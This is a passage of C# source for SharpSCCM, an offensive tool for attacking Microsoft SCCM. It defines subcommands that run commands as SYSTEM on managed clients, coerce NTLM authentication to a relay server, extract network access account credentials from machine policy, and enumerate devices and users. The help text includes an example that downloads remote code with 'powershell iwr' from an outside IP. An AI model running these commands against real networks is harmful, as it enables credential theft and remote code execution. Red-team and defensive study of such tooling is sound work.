using System;
using System.CommandLine;
using System.CommandLine.Builder;
using System.CommandLine.NamingConventionBinder;
using System.CommandLine.Parsing;
using System.Diagnostics;
using System.IO.Ports;
using System.Linq;
using System.Management;
using System.Text.RegularExpressions;
using System.Xml.Linq;

// Configuration Manager SDK
using Microsoft.ConfigurationManagement.Messaging.Framework;
using Microsoft.ConfigurationManagement.Messaging.Messages;

namespace SharpSCCM
{
     static class Program
    {
        static void Main(string[] args)
        {
            // Debug options
            bool debug = false;
            ConsoleTraceListener consoleTracer = new ConsoleTraceListener();
            if (args.Contains(new[] { "--debug" }))
            {
                debug = true;
                MessagingTrace.TraceSwitch.Level = TraceLevel.Verbose;
                Trace.Listeners.Add(consoleTracer);
            }

            // Execution timer
            var timer = new Stopwatch();
            timer.Start();

            // Command line options
            try
            {
                Console.WriteLine();
                Console.WriteLine("  _______ _     _ _______  ______  _____  _______ _______ _______ _______");
                Console.WriteLine("  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |");
                Console.WriteLine("  ______| |     | |     | |    \\_ |       ______| |______ |______ |  |  |");
                Console.WriteLine();

                // Gather required arguments
                var rootCommand = new RootCommand("A C# utility for interacting with SCCM (now Microsoft Endpoint Configuration Manager) by Chris Thompson (@_Mayyhem)");
                rootCommand.AddGlobalOption(new Option<bool>("--debug", "Print debug messages for troubleshooting"));

                //
                // Subcommands
                //

                // exec command
                var execCommand = new Command("exec", "Execute a command, binary, or script on a client or request NTLM authentication from a client\n" +
                    "  Permitted security roles:\n" +
                    "    - Full Administrator\n" +
                    "    - Application Administrator\n" +
                    "    Examples:\n" +
                    "    - https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867");
                rootCommand.Add(execCommand);
                execCommand.Add(new Option<string>(new[] { "--device", "-d" }, "The ResourceName of the device to execute a command, binary, or script on or receive NTLM authentication from"));
                execCommand.Add(new Option<string>(new[] { "--collection-id", "-i" }, "The CollectionID of the device or user collection to execute a command, binary, or script on or receive NTLM authentication from"));
                execCommand.Add(new Option<string>(new[] { "--collection-name", "-n" }, "The name of the device or user collection to execute a command, binary, or script on or receive NTLM authentication from"));
                execCommand.Add(new Option<string>(new[] { "--path", "-p" }, "The command or the UNC path of the binary/script to execute (e.g., \"powershell iwr http://192.168.57.130/a\", \"C:\\Windows\\System32\\calc.exe\", \"\\\\site-server.domain.com\\Sources$\\my.exe\")"));
                execCommand.Add(new Option<string>(new[] { "--relay-server", "-r" }, "The NetBIOS name, IP address, or if WebClient is enabled on the targeted client device, the IP address and port (e.g., \"192.168.1.1@8080\") of the relay/capture server (default: the machine running SharpSCCM)"));
                execCommand.Add(new Option<string>(new[] { "--resource-id", "-rid" }, "The unique ResourceID of the device or user to execute a command, binary, or script on or receive NTLM authentication from"));
                execCommand.Add(new Option<bool>(new[] { "--run-as-system", "-s" }, "Execute the application in the SYSTEM context (default: logged on user)"));
                execCommand.Add(new Option<string>(new[] { "--collection-type", "-t" }, "The type of the collection (\"device\" or \"user\")").FromAmong(new string[] { "device", "user" }));
                execCommand.Add(new Option<string>(new[] { "--user", "-u" }, "The UniqueUserName of the user to execute an application as or receive NTLM authentication from (e.g., \"APERTURE\\cave.johnson\")"));
                execCommand.Add(new Option<string>(new[] { "--management-point", "-mp" }, "The IP address, FQDN, or NetBIOS name of the management point to connect to (default: the current management point of the client running SharpSCCM)"));
                execCommand.Add(new Option<string>(new[] { "--site-code", "-sc" }, "The three character site code (e.g., \"PS1\") (default: the site code of the client running SharpSCCM)"));
                execCommand.Handler = CommandHandler.Create(
                    (string device, string collectionId, string collectionName, string path, string relayServer, string resourceId, bool runAsSystem, string collectionType, string user, string managementPoint, string siteCode) =>
                    {
                        if (!string.IsNullOrEmpty(relayServer) && !string.IsNullOrEmpty(path) || (string.IsNullOrEmpty(relayServer) && string.IsNullOrEmpty(path)))
                        {
                            Console.WriteLine("[!] Please specify either a path (-p) or a relay server (-r)");
                        }
                        else if (string.IsNullOrEmpty(device) && string.IsNullOrEmpty(collectionId) && string.IsNullOrEmpty(collectionName) && string.IsNullOrEmpty(resourceId) && string.IsNullOrEmpty(user))
                        {
                            Console.WriteLine("[!] Please specify a collection Name (-n), CollectionID (-i), device Name (-d), user UniqueUserName (-u), or ResourceID (-rid) to execute the application");
                        }
                        else if (!string.IsNullOrEmpty(device) && !string.IsNullOrEmpty(user))
                        {
                            Console.WriteLine("[!] Please specify either a device Name (-d) or a user UniqueUserName (-u)");
                        }
                        else 
                        {
                            ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                            if (wmiConnection != null && wmiConnection.IsConnected)
                            {
                                MgmtPointWmi.Exec(wmiConnection, collectionId, collectionName, device, path, relayServer, resourceId, !runAsSystem, collectionType, user);
                            }
                        }
                    });

                // get 
                var getCommand = new Command("get", "A group of commands that fetch objects from a management point via WMI or HTTP(S)");
                rootCommand.Add(getCommand);
                getCommand.AddGlobalOption(new Option<string>(new[] { "--management-point", "-mp" }, "The IP address, FQDN, or NetBIOS name of the management point to connect to (default: the current management point of the client running SharpSCCM)"));
                getCommand.AddGlobalOption(new Option<string>(new[] { "--site-code", "-sc" }, "The three character site code (e.g., PS1) (default: the site code of the client running SharpSCCM)"));

                // get applications
                var getApplication = new Command("applications", "Get information on applications from a management point via WMI\n" +
                    "  Permitted security roles:\n" +
                    "    - Full Administrator\n" +
                    "    - Application Administrator\n" +
                    "    - Application Author\n" +
                    "    - Application Deployment Manager\n" +
                    "    - Operating System Deployment Manager\n" +
                    "    - Operations Administrator\n" +
                    "    - Read-only Analyst");
                getCommand.Add(getApplication);
                getApplication.Add(new Option<bool>(new[] { "--count", "-c" }, "Returns the number of rows that match the specified criteria"));
                getApplication.Add(new Option<string>(new[] { "--name", "-n" }, "A string to search for in application names (returns all applications where the name contains the provided string"));
                getApplication.Add(new Option<string>(new[] { "--order-by", "-o" }, "An ORDER BY clause to set the order of data returned by the query (e.g., \"ResourceID DESC\") (default: ascending (ASC) order)"));
                getApplication.Add(new Option<string[]>(new[] { "--properties", "-p" }, "Specify this option for each property to query (e.g., \"-p CI_ID -p LocalizedDisplayName\"") { Arity = ArgumentArity.OneOrMore });
                getApplication.Add(new Option<bool>(new[] { "--verbose", "-v" }, "Display all class properties and their values"));
                getApplication.Add(new Option<string>(new[] { "--where-condition", "-w" }, "A WHERE condition to narrow the scope of data returned by the query (e.g., \"LocalizedDisplayName='app0'\" or \"LocalizedDisplayName LIKE '%app%'\")"));
                getApplication.Add(new Option<bool>(new[] { "--dry-run", "-z" }, "Display the resulting WQL query but do not connect to the specified server and execute it"));
                getApplication.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, bool count, string name, string orderBy, string[] properties, bool verbose, string whereCondition, bool dryRun) =>
                    {
                        if (!string.IsNullOrEmpty(name))
                        {
                            whereCondition = $"LocalizedDisplayName='{name}'";
                        }
                        if (properties.Length == 0 && !verbose)
                        {
                            properties = new[] { "CI_ID", "CI_UniqueID", "CreatedBy", "DateCreated", "ExecutionContext", "DateLastModified", "IsDeployed", "IsEnabled", "IsHidden", "LastModifiedBy", "LocalizedDisplayName", "NumberOfDevicesWithApp", "NumberOfDevicesWithFailure", "NumberOfUsersWithApp", "NumberOfUsersWithFailure", "SourceSite" };
                        }
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            MgmtUtil.GetClassInstances(wmiConnection, "SMS_Application", null, count, properties, whereCondition, orderBy, dryRun, verbose, printOutput: true);
                        }
                    });

                // get classes
                var getClasses = new Command("classes", "Get a list of WMI classes from a management point\n" +
                    "  Permitted security roles:\n" +
                    "    - Any (SMS Admins local group)");
                getCommand.Add(getClasses);
                getClasses.Add(new Option<string>(new[] { "--wmi-namespace", "-n" }, "The WMI namespace to query (default: \"root\\SMS\\site_<site-code>\")"));
                getClasses.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, string wmiNamespace) =>
                    {
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, wmiNamespace, siteCode);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            MgmtUtil.PrintClasses(wmiConnection);
                        }
                    });

                // get class-instances
                var getClassInstances = new Command("class-instances", "Get information on WMI class instances from a management point\n" +
                    "  Permitted security roles:\n" +
                    "    - ACLs are applied at the object class and instance level");
                getCommand.Add(getClassInstances);
                getClassInstances.Add(new Argument<string>("wmi-class", "The WMI class to query (e.g., \"SMS_R_System\")"));
                getClassInstances.Add(new Option<bool>(new[] { "--count", "-c" }, "Returns the number of rows that match the specified criteria"));
                getClassInstances.Add(new Option<string>(new[] { "--wmi-namespace", "-n" }, "The WMI namespace to query (default: \"root\\SMS\\site_<site-code>\")"));
                getClassInstances.Add(new Option<string>(new[] { "--order-by", "-o" }, "An ORDER BY clause to set the order of data returned by the query (e.g., \"Name DESC\") (default: ascending (ASC) order)"));
                getClassInstances.Add(new Option<string[]>(new[] { "--properties", "-p" }, "Specify this option for each property to query (e.g., \"-p Name -p LastLogonUserName\"") { Arity = ArgumentArity.OneOrMore });
                getClassInstances.Add(new Option<bool>(new[] { "--verbose", "-v" }, "Display all class properties and their values"));
                getClassInstances.Add(new Option<string>(new[] { "--where-condition", "-w" }, "A WHERE condition to narrow the scope of data returned by the query (e.g., \"LastLogonUserName='cave.johnson'\" or \"LastLogonUserName LIKE '%cave%'\")"));
                getClassInstances.Add(new Option<bool>(new[] { "--dry-run", "-z" }, "Display the resulting WQL query but do not connect to the specified server and execute it"));
                getClassInstances.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, bool count, string wmiNamespace, string wmiClass, string orderBy, string[] properties, bool verbose, string whereCondition, bool dryRun) =>
                    {
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, wmiNamespace, siteCode);
                        if (properties.Length == 0)
                        {
                            verbose = true;
                        }
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            MgmtUtil.GetClassInstances(wmiConnection, wmiClass, null, count, properties, whereCondition, orderBy, dryRun, verbose, printOutput: true);
                        }
                    });

                // get class-properties
                var getClassProperties = new Command("class-properties", "Get all properties of a specified WMI class from a management point\n" +
                    "  Permitted security roles:\n" +
                    "    - Any (SMS Admins local group)");
                getCommand.Add(getClassProperties);
                getClassProperties.Add(new Argument<string>("wmi-class", "The WMI class to query (e.g., \"SMS_R_System\")"));
                getClassProperties.Add(new Option<string>(new[] { "--wmi-namespace", "-n" }, "The WMI namespace to query (default: \"root\\SMS\\site_<site-code>\")"));
                getClassProperties.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, string wmiClass, string wmiNamespace) =>
                    {
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, wmiNamespace, siteCode);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            ManagementObject classInstance = new ManagementClass(wmiConnection, new ManagementPath(wmiClass), new ObjectGetOptions()).CreateInstance();
                            MgmtUtil.PrintClassProperties(classInstance);
                        }
                    });

                // get collections
                var getCollection = new Command("collections", "Get information on collections from a management point via WMI\n" +
                    "  Permitted security roles:\n" +
                    "    - Any (SMS Admins local group)");
                getCommand.Add(getCollection);
                getCollection.Add(new Option<bool>(new[] { "--count", "-c" }, "Returns the number of rows that match the specified criteria"));
                getCollection.Add(new Option<string>(new[] { "--id", "-i" }, "A string to search for in collection CollectionIDs (returns all collections where the CollectionID contains the provided string)"));
                getCollection.Add(new Option<string>(new[] { "--name", "-n" }, "A string to search for in collection names (returns all collections where the collections name contains the provided string)"));
                getCollection.Add(new Option<string>(new[] { "--order-by", "-o" }, "An ORDER BY clause to set the order of data returned by the query (e.g., \"Name DESC\") (default: ascending (ASC) order)"));
                getCollection.Add(new Option<string[]>(new[] { "--properties", "-p" }, "Specify this option for each property to query (e.g., \"-p Name -p MemberCount\"") { Arity = ArgumentArity.OneOrMore });
                getCollection.Add(new Option<bool>(new[] { "--verbose", "-v" }, "Display all class properties and their values"));
                getCollection.Add(new Option<string>(new[] { "--where-condition", "-w" }, "A WHERE condition to narrow the scope of data returned by the query (e.g., \"Name='collection0'\" or \"Name LIKE '%collection%'\")"));
                getCollection.Add(new Option<bool>(new[] { "--dry-run", "-z" }, "Display the resulting WQL query but do not connect to the specified server and execute it"));
                getCollection.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, bool count, string id, string name, string orderBy, string[] properties, bool verbose, string whereCondition, bool dryRun) =>
                    {
                        if (!string.IsNullOrEmpty(id))
                        {
                            whereCondition = $"CollectionID LIKE '%{id}%'";
                        }
                        else if (!string.IsNullOrEmpty(name))
                        {
                            whereCondition = $"Name LIKE '%{name}%'";
                        }
                        if (properties.Length == 0 && !verbose)
                        {
                            properties = new[] { "CollectionID", "CollectionType", "IsBuiltIn", "LastMemberChangeTime", "LastRefreshTime", "LimitToCollectionName", "MemberClassName", "MemberCount", "Name" };
                        }
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            MgmtUtil.GetClassInstances(wmiConnection, "SMS_Collection", null, count, properties, whereCondition, orderBy, dryRun, verbose, printOutput: true);
                        }
                    });

                // get collection-members
                var getCollectionMember = new Command("collection-members", "Get the members of a specified collection from a management point via WMI\n" +
                    "  Permitted security roles:\n" +
                    "    - Any (SMS Admins local group)");
                getCommand.Add(getCollectionMember);
                getCollectionMember.Add(new Option<bool>(new[] { "--count", "-c" }, "Returns the number of rows that match the specified criteria"));
                getCollectionMember.Add(new Option<string>(new[] { "--device", "-d" }, "The name of the device to get collection membership for (returns all collection members where the name contains the provided string)"));
                getCollectionMember.Add(new Option<string>(new[] { "--collection-id", "-i" }, "The CollectionID of the collection to get members for"));
                getCollectionMember.Add(new Option<string>(new[] { "--collection-name", "-n" }, "The name of the collection to get members for"));
                getCollectionMember.Add(new Option<string>(new[] { "--order-by", "-o" }, "An ORDER BY clause to set the order of data returned by the query (e.g., \"Name DESC\") (default: ascending (ASC) order)"));
                getCollectionMember.Add(new Option<string[]>(new[] { "--properties", "-p" }, "Specify this option for each property to query (e.g., \"-p Name -p IsActive\"") { Arity = ArgumentArity.OneOrMore });
                getCollectionMember.Add(new Option<string>(new[] { "--resource-id", "-r" }, "The unique ResourceID of the device or user to get applicable rules for"));
                getCollectionMember.Add(new Option<string>(new[] { "--user", "-u" }, "The UniqueUserName of the user to get collection membership for (e.g., \"APERTURE\\cave.johnson\") (returns all collection members where the name contains the provided string)"));
                getCollectionMember.Add(new Option<bool>(new[] { "--verbose", "-v" }, "Display all class properties and their values"));
                getCollectionMember.Add(new Option<string>(new[] { "--where-condition", "-w" }, "A WHERE condition to narrow the scope of data returned by the query (e.g., \"IsActive='True'\" or \"Name LIKE '%cave-johnson%'\")"));
                getCollectionMember.Add(new Option<bool>(new[] { "--dry-run", "-z" }, "Display the resulting WQL query but do not connect to the specified server and execute it"));
                // COUNT and ORDER BY don't seem to work when querying SMS_CollectionMember_a
                getCollectionMember.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, bool count, string device, string collectionId, string collectionName, string orderBy, string[] properties, string resourceId, string user, bool verbose, string whereCondition, bool dryRun) =>
                    {
                        if (string.IsNullOrEmpty(collectionName) && string.IsNullOrEmpty(collectionId) && string.IsNullOrEmpty(device) && string.IsNullOrEmpty(resourceId) && string.IsNullOrEmpty(user))
                        {
                            Console.WriteLine("[!] Please specify a CollectionID (-i), collection Name (-n), device or user ResourceID (-r), device Name (-d), or user Name (-u)");
                        }
                        else if (!string.IsNullOrEmpty(device) && !string.IsNullOrEmpty(user))
                        {
                            Console.WriteLine("[!] Please specify either a device Name (-d) or user Name (-u)");
                        }
                        else
                        {
                            ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                            if (wmiConnection != null && wmiConnection.IsConnected)
                            {
                                if (properties.Length == 0 && !verbose)
                                {
                                    properties = new[] { "ClientCertType", "CollectionID", "Domain", "IsActive", "IsApproved", "IsAssigned", "IsClient", "Name", "ResourceID", "SiteCode", "SMSID" };
                                }
                                if (!string.IsNullOrEmpty(collectionId) || !string.IsNullOrEmpty(collectionName))
                                {

                                    MgmtPointWmi.GetCollectionMembers(wmiConnection, collectionName, collectionId, count, properties, whereCondition, orderBy, dryRun, verbose, true);
                                }
                                else if (!string.IsNullOrEmpty(device) || !string.IsNullOrEmpty(resourceId) || !string.IsNullOrEmpty(user))
                                {
                                    whereCondition = !string.IsNullOrEmpty(whereCondition) ? whereCondition : !string.IsNullOrEmpty(resourceId) ? $"ResourceID='{resourceId}'" : !string.IsNullOrEmpty(device) ? $"Name LIKE '%{device}%'" : !string.IsNullOrEmpty(user) ? $"Name LIKE '%{user}%'" : null;
                                    MgmtUtil.GetClassInstances(wmiConnection, "SMS_FullCollectionMembership", null, count, properties, whereCondition, orderBy, dryRun, verbose, true, true);
                                }
                            }
                        }
                    });

                // get collection-rules
                var getCollectionRule = new Command("collection-rules", "Get the rules that are evaluated to add members to a collection from a management point via WMI\n" +
                    "  Permitted security roles:\n" +
                    "    - Any (SMS Admins local group)");
                getCommand.Add(getCollectionRule);
                getCollectionRule.Add(new Option<string>(new[] { "--device", "-d" }, "The name of the device to get applicable rules for"));
                getCollectionRule.Add(new Option<string>(new[] { "--collection-id", "-i" }, "The CollectionID of the collection to get applicable rules for"));
                getCollectionRule.Add(new Option<string>(new[] { "--collection-name", "-n" }, "The name of the collection to get applicable rules for"));
                getCollectionRule.Add(new Option<string>(new[] { "--user", "-u" }, "The UniqueUserName of the user to get applicable rules for (e.g., \"APERTURE\\cave.johnson\")"));
                getCollectionRule.Add(new Option<string>(new[] { "--resource-id", "-r" }, "The unique ResourceID of the device or user to get applicable rules for"));
                getCollectionRule.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, string device, string collectionId, string collectionName, string user, string resourceId) =>
                    {
                        if ((string.IsNullOrEmpty(collectionName) && string.IsNullOrEmpty(collectionId) && string.IsNullOrEmpty(device) && string.IsNullOrEmpty(user) && string.IsNullOrEmpty(resourceId)) ||
                            (new string[] { collectionName, collectionId, device, user, resourceId }.Count(x => x != null) > 1))
                        {
                            Console.WriteLine("[!] Please specify a collection Name (-n), CollectionID (-i), device Name (-d), user UniqueUserName (-u), or ResourceID (-r) to get applicable rules for");
                        }
                        else
                        {
                            ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                            if (wmiConnection != null && wmiConnection.IsConnected)
                            {
                                MgmtPointWmi.GetCollectionRule(wmiConnection, collectionName, collectionId, device, user, resourceId);
                            }
                        }
                    });

                // get deployments
                var getDeployment = new Command("deployments", "Get information on deployments from a management point via WMI\n" +
                    "  Permitted security roles:\n" +
                    "    - Full Administrator\n" +
                    "    - Application Administrator\n" +
                    "    - Application Author\n" +
                    "    - Application Deployment Manager\n" +
                    "    - Operating System Deployment Manager\n" +
                    "    - Operations Administrator\n" +
                    "    - Read-only Analyst");
                getCommand.Add(getDeployment);
                getDeployment.Add(new Option<bool>(new[] { "--count", "-c" }, "Returns the number of rows that match the specified criteria"));
                getDeployment.Add(new Option<string>(new[] { "--name", "-n" }, "A string to search for in deployment names (returns all deployments where the name contains the provided string)"));
                getDeployment.Add(new Option<string>(new[] { "--order-by", "-o" }, "An ORDER BY clause to set the order of data returned by the query (e.g., \"Name DESC\") (default: ascending (ASC) order)"));
                getDeployment.Add(new Option<string[]>(new[] { "--properties", "-p" }, "Specify this option for each property to query (e.g., \"-p Name -p MemberCount\"") { Arity = ArgumentArity.OneOrMore });
                getDeployment.Add(new Option<bool>(new[] { "--verbose", "-v" }, "Display all class properties and their values"));
                getDeployment.Add(new Option<string>(new[] { "--where-condition", "-w" }, "A WHERE condition to narrow the scope of data returned by the query (e.g., \"Name='collection0'\" or \"Name LIKE '%collection%'\")"));
                getDeployment.Add(new Option<bool>(new[] { "--dry-run", "-z" }, "Display the resulting WQL query but do not connect to the specified server and execute it"));
                getDeployment.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, bool count, string name, string orderBy, string[] properties, bool verbose, string whereCondition, bool dryRun) =>
                    {
                        if (!string.IsNullOrEmpty(name))
                        {
                            whereCondition = $"AssignmentName LIKE '%{name}%'";
                        }
                        if (properties.Length == 0 && !verbose)
                        {
                            properties = new[] { "ApplicationName", "AssignedCI_UniqueID", "AssignedCIs", "AssignmentName", "CollectionName", "Enabled", "EnforcementDeadline", "LastModificationTime", "LastModifiedBy", "NotifyUser", "SourceSite", "TargetCollectionID", "UserUIExperience" };
                        }
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            MgmtUtil.GetClassInstances(wmiConnection, "SMS_ApplicationAssignment", null, count, properties, whereCondition, orderBy, dryRun, verbose, printOutput: true);
                        }
                    });

                // get devices
                var getDevice = new Command("devices", "Get information on devices from a management point via WMI\n" +
                    "  Permitted security roles:\n" +
                    "    - Any (SMS Admins local group)");
                getCommand.Add(getDevice);
                getDevice.Add(new Option<bool>(new[] { "--count", "-c" }, "Returns the number of rows that match the specified criteria"));
                getDevice.Add(new Option<string>(new[] { "--name", "-n" }, "A string to search for in device names (returns all devices where the device name contains the provided string)"));
                getDevice.Add(new Option<string>(new[] { "--order-by", "-o" }, "An ORDER BY clause to set the order of data returned by the query (e.g., \"Name DESC\") (default: ascending (ASC) order)"));
                getDevice.Add(new Option<string[]>(new[] { "--properties", "-p" }, "Specify this option for each property to query (e.g., \"-p Name -p LastLogonUserName\"") { Arity = ArgumentArity.OneOrMore });
                getDevice.Add(new Option<string>(new[] { "--last-user", "-u" }, "Get information on devices where a specific user was the last to log in (matches exact string provided) (note: output reflects the last user logon at the point in time the last heartbeat DDR and hardware inventory was sent to the management point and may not be accurate)"));
                getDevice.Add(new Option<bool>(new[] { "--verbose", "-v" }, "Display all class properties and their values"));
                getDevice.Add(new Option<string>(new[] { "--where-condition", "-w" }, "A WHERE condition to narrow the scope of data returned by the query (e.g., \"LastLogonUserName='cave.johnson'\" or \"LastLogonUserName LIKE '%cave%'\")"));
                getDevice.Add(new Option<bool>(new[] { "--dry-run", "-z" }, "Display the resulting WQL query but do not connect to the specified server and execute it"));
                getDevice.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, bool count, string name, string orderBy, string[] properties, string lastUser, bool verbose, string whereCondition, bool dryRun) =>
                    {
                        if (!string.IsNullOrEmpty(lastUser))
                        {
                            whereCondition = $"LastLogonUserName='{lastUser}'";
                        }
                        else if (!string.IsNullOrEmpty(name))
                        {
                            whereCondition = $"Name LIKE '%{name}%'";
                        }
                        if (properties.Length == 0 && !verbose)
                        {
                            properties = new[] { "Active", "ADSiteName", "Client", "DistinguishedName", "FullDomainName", "HardwareID", "IPAddresses", "IPSubnets", "IPv6Addresses", "IPv6Prefixes", "IsVirtualMachine", "LastLogonTimestamp", "LastLogonUserDomain", "LastLogonUserName", "MACAddresses", "Name", "NetbiosName", "Obsolete", "OperatingSystemNameandVersion", "PrimaryGroupID", "ResourceDomainORWorkgroup", "ResourceId", "ResourceNames", "SID", "SMSInstalledSites", "SMSUniqueIdentifier", "SNMPCommunityName", "SystemContainerName", "SystemGroupName", "SystemOUName" };
                        }
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            MgmtUtil.GetClassInstances(wmiConnection, "SMS_R_System", null, count, properties, whereCondition, orderBy, dryRun, verbose, printOutput: true);
                        }
                    });

                // get primary-users
                var getPrimaryUser = new Command("primary-users", "Get information on primary users set for devices from a management point via WMI\n" +
                    "  Permitted security roles:\n" +
                    "    - Full Administrator\n" +
                    "    - Application Administrator\n" +
                    "    - Application Deployment Manager\n" +
                    "    - Operations Administrator\n" +
                    "    - Read-only Analyst");
                getCommand.Add(getPrimaryUser);
                getPrimaryUser.Add(new Option<bool>(new[] { "--count", "-c" }, "Returns the number of rows that match the specified criteria"));
                getPrimaryUser.Add(option: new Option<string>(new[] { "--device", "-d" }, "A specific device to search for (returns the primary user for the device matching the exact string provided)"));
                getPrimaryUser.Add(new Option<string>(new[] { "--order-by", "-o" }, "An ORDER BY clause to set the order of data returned by the query (e.g., \"ResourceID DESC\") (default: ascending (ASC) order)"));
                getPrimaryUser.Add(new Option<string[]>(new[] { "--properties", "-p" }, "Specify this option for each property to query (e.g., \"-p ResourceName -p UniqueUserName\"") { Arity = ArgumentArity.OneOrMore });
                getPrimaryUser.Add(new Option<string>(new[] { "--user", "-u" }, "A specific user to search for (returns all devices where the primary user name contains the provided string)"));
                getPrimaryUser.Add(new Option<bool>(new[] { "--verbose", "-v" }, "Display all class properties and their values"));
                getPrimaryUser.Add(new Option<string>(new[] { "--where-condition", "-w" }, "A WHERE condition to narrow the scope of data returned by the query (e.g., \"UniqueUserName='APERTURE\\cave.johnson'\" or \"UniqueUserName LIKE '%cave.johnson%'\")"));
                getPrimaryUser.Add(new Option<bool>(new[] { "--dry-run", "-z" }, "Display the resulting WQL query but do not connect to the specified server and execute it"));
                getPrimaryUser.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, bool count, string device, string orderBy, string[] properties, string user, bool verbose, string whereCondition, bool dryRun) =>
                    {
                        if (!string.IsNullOrEmpty(device))
                        {
                            whereCondition = $"ResourceName='{device}'";
                        }
                        else if (!string.IsNullOrEmpty(user))
                        {
                            whereCondition = $"UniqueUserName LIKE '%{user}%'";
                        }
                        if (properties.Length == 0)
                        {
                            verbose = true;
                        }
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            // Don't get lazy props for this function. ResourceName won't populate.
                            MgmtUtil.GetClassInstances(wmiConnection, "SMS_UserMachineRelationship", null, count, properties, whereCondition, orderBy, dryRun, verbose, false, true);
                        }
                    });

                // get secrets
                var getSecretsFromPolicy = new Command("secrets", "Request the machine policy from a management point via HTTP to obtain credentials for network access accounts, collection variables, and task sequences\n" +
                    "  Requirements:\n" +
                    "    - Domain computer account credentials\n" +
                    "        OR\n" +
                    "    - Local Administrators group membership on a client");
                // get naa alias for backward compatibility
                getSecretsFromPolicy.AddAlias("naa");
                getCommand.Add(getSecretsFromPolicy);
                getSecretsFromPolicy.Add(new Option<string>(new[] { "--certificate", "-c" }, "The encoded X509 certificate blob to use that corresponds to a previously registered device"));
                getSecretsFromPolicy.Add(new Option<string>(new[] { "--client-id", "-i" }, "The SMS client GUID to use that corresponds to a previously registered device and certificate"));
                getSecretsFromPolicy.Add(new Option<string>(new[] { "--output-file", "-o" }, "The path where the policy XML will be written to"));
                getSecretsFromPolicy.Add(new Option<string>(new[] { "--password", "-p" }, "The password for the specified computer account"));
                getSecretsFromPolicy.Add(new Option<string>(new[] { "--register-client", "-r" }, "The name of the device to register as a new client (required when user is not a local administrator)"));
                getSecretsFromPolicy.Add(new Option<string>(new[] { "--username", "-u" }, "The name of the computer account to register the new device record with, including the trailing \"$\""));
                getSecretsFromPolicy.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, string certificate, string clientId, string outputFile, string password, string registerClient, string username) =>
                    {
                        if (managementPoint == null || siteCode == null)
                        {
                            (managementPoint, siteCode) = ClientWmi.GetCurrentManagementPointAndSiteCode();
                        }
                        if (!string.IsNullOrEmpty(managementPoint) && !string.IsNullOrEmpty(siteCode))
                        {
                            if (!string.IsNullOrEmpty(certificate) && !string.IsNullOrEmpty(clientId))
                            {
                                MgmtPointMessaging.GetSecretsFromPolicy(managementPoint, siteCode, certificate, clientId, null, null, null, outputFile);
                            }
                            else if (!string.IsNullOrEmpty(certificate) && string.IsNullOrEmpty(clientId) || string.IsNullOrEmpty(certificate) && !string.IsNullOrEmpty(clientId))
                            {
                                Console.WriteLine("[!] Both a certificate (-c) and SMS client GUID (-i) for a previously registered client must be specified when using this option");
                            }
                            else if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password) && !string.IsNullOrEmpty(registerClient))
                            {
                                MgmtPointMessaging.GetSecretsFromPolicy(managementPoint, siteCode, null, null, username, password, registerClient, outputFile);
                            }
                            else if (!string.IsNullOrEmpty(registerClient) && (string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password)))
                            {
                                Console.WriteLine("[!] Both a computer account name (-u) and computer account password (-p) must be specified when using the register client (-r) option");
                            }
                            else if (Helpers.IsHighIntegrity())
                            {
                                MgmtPointMessaging.GetSecretsFromPolicy(managementPoint, siteCode, certificate, clientId, username, password, registerClient, outputFile);
                            }
                            else
                            {
                                Console.WriteLine("[!] A client name to register (-r), computer account name (-u), and computer account password (-p) must be specified when the user is not a local administrator");
                            }
                        }
                    });

                // get site-push-settings
                var getSitePushSettings = new Command("site-push-settings", "Get automatic client push installation settings from a management point via WMI\n" +
                    "  Permitted security roles:\n" +
                    "    - Any (SMS Admins local group)");
                getCommand.Add(getSitePushSettings);
                getSitePushSettings.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode) =>
                    {
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            MgmtPointWmi.GetSitePushSettings(wmiConnection);
                        }
                    });

                // get software
                var getSoftware = new Command("software", "Query a management point for distribution point content locations");
                getCommand.Add(getSoftware);
                getSoftware.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode) =>
                    {
                        if (managementPoint == null || siteCode == null)
                        {
                            (managementPoint, siteCode) = ClientWmi.GetCurrentManagementPointAndSiteCode();
                        }
